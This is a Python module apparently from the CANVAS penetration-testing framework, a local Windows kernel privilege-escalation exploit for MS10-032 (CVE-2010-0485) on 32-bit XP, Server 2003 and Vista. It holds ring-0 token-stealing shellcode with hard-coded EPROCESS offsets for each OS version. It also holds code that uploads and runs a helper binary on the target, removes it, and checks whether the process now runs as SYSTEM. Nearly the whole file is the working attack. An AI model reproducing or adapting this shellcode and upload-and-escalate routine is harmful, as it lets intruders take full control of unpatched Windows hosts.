#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

import socket
import time
import struct
import base64

from exploitutils import *
from canvasexploit import canvasexploit

from ExploitTypes.localexploit import LocalExploit
from shelllistener import *
from MOSDEF import mosdef
import canvasengine
import random 

NAME='ms10_032'
DESCRIPTION='Win32k Window Creation Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['CVE Name']='CVE-2010-0485'
DOCUMENTATION['CVE Url']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0485'
#DOCUMENTATION['CVSS'] = ??
DOCUMENTATION['MSRC']='http://www.microsoft.com/technet/security/bulletin/ms10-032.mspx'
DOCUMENTATION['Date public']='06/08/10'
DOCUMENTATION['Notes']='''This is a local kernel vulnerability for XP, 2003, and Vista. It will only work on 32 bit platform. 
The binary will not trigger the bug if running on a 64 bit OS or if it is running on a kernel version
it does not recognize (various chunks in the kernel are used to break DEP).
'''

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP','2003','Vista']
PROPERTY['MSADV']='MS10-032'
PROPERTY['MS PATCHES']=["KB979559"]

NOTES="""
"""

TODO="""
Usage:
Win32/MOSDEF$ runmodule ms10_032
"""

targets={
    0: ['Autoversioning',0],
}

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name            = NAME
        self.upload_filename = 'Resources/ms10_032.exe'
        self.remote_filename = ''
        self.result          = 0

    def CreateRing0Shellcode(self,pid=-1,retadd=0,osmajor=-1,osminor=-1):
        """Replace the Token of a Process by the one of the System process
           If _pid_ is -1, then the 'current' process Token will be replaced,
           otherwise, the one of the process with the given _pid_ will be.
           _retadd_ adjusts the stack for the 'ret' instruction, it depends
           from where your shellcode is called"""

        self.log('pid=%d, osmajor=%d, osminor=%d'%(pid,osmajor,osminor))
        ring0shellcode=""".byte 0x90
    xorl %eax,%eax
    movl %fs:0x124(%eax),%eax
    movl 0xProcessOffset(%eax),%eax
    movl %eax,%ecx
find_system_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xSystemProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_system_process
    movl 0xTokenOffset(%eax),%edx //Token of System process
    movl %ecx,%eax
"""
        if pid!=-1:
            ring0shellcode+="""find_our_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xOurProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_our_process
"""
        ring0shellcode+='    movl %edx,0xTokenOffset(%eax) //Replace the Token of our process\n'
        if retadd==0:
            ring0shellcode+='    ret\n'
        else:
            ring0shellcode+='    ret $0x%x\n'%(retadd)
        self.log('Creating RING0 Token stealing shellcode for ProcessId %d'%(pid))
        
        if osmajor==6:
            self.log('Windows Vista & 2008 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x48 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0xa0 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x9c #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xe0 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==2:
            self.log('Windows Server 2003 SP0 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x44 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x88 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x84 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xc8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==3: #we set minor to 3 if 2003 SP1 or above
            self.log('Windows Server 2003 SP1-SP2 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x38 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x98 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x94 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xd8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==1:
            self.log('Windows XP RING0...')
            parameters={}
            parameters['ProcessOffset']=0x44 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x88 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x84 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xc8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        else:
            self.log('Invalid OS version')
            return 0

        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))
        self.shellcode=mosdef.assemble(ring0shellcode,'x86')

        return self.shellcode

    def run_attack(self,node):
        self.node=node #XXX: not needed?

        #first, we check to make sure we are not 
        #already local/SYSTEM - is there a better way?
        whoami=self.exploitnodes('whoami',[node])[0]
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log("It appears you are already running as LOCAL/SYSTEM!")
            return 1
        
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        #if major!=5 or minor<1:
        if major!=5 and major!=6:
            self.log('OS not supported')
            return 0
        if major==5 and minor==2 and (nodeos['SP string']=='Service Pack 1' or nodeos['SP string']=='Service Pack 2'):
            minor=3 #Windows 2003 SP1 or SP2 are considered 5.3 by the shellcode
        
        # Upload and execute the exploit with the shellcode as a commandline
        # argument.
        self.remote_filename=self.node.shell.getcwd()+'\\tempfile%s.exe'%random.randint(0,50)
        self.log("Uploading %s to remote node"%self.remote_filename)
        try:
            ret=self.node.shell.upload(self.upload_filename,destfilename=self.remote_filename)
        except NodeCommandError, msg:
            self.log("Could not upload file to %s - trying temp directory"%self.remote_filename)
            self.remote_filename = self.node.shell.GetTempPathA()+"\\tempfile%s.exe"%random.randint(0,50)
            self.log("Uploading %s to remote node"%self.remote_filename)
            try:
                ret=self.node.shell.upload(self.upload_filename,destfilename=self.remote_filename)
            except NodeCommandError, msg:
                self.log("Could not upload file to %s."%self.remote_filename)
                self.log("Failed to create remote file!")
                return 0
            
        self.log("File uploaded.")
        if ret:
            pid=node.shell.getpid()
            self.CreateRing0Shellcode(pid,0,major,minor) #XXX: WTF
            self.shellcode+='\x90'*(3-(len(self.shellcode)%3))
            arguments=base64.b64encode(self.shellcode)
            ret=self.node.shell.dospawn('"%s" %s'%(self.remote_filename,arguments))
            self.log('DoSpawn Returned %s'%(ret))
        time.sleep(3)
        self.log('Removing uploaded file')
        self.node.shell.unlink(self.remote_filename)
        whoami=self.exploitnodes('whoami',[node])[0]
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log('Exploit succeeded!')
            self.setSucceeded()
            self.result=1
            return 1
        self.log('Exploit seem to have failed.')
        return 0

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'

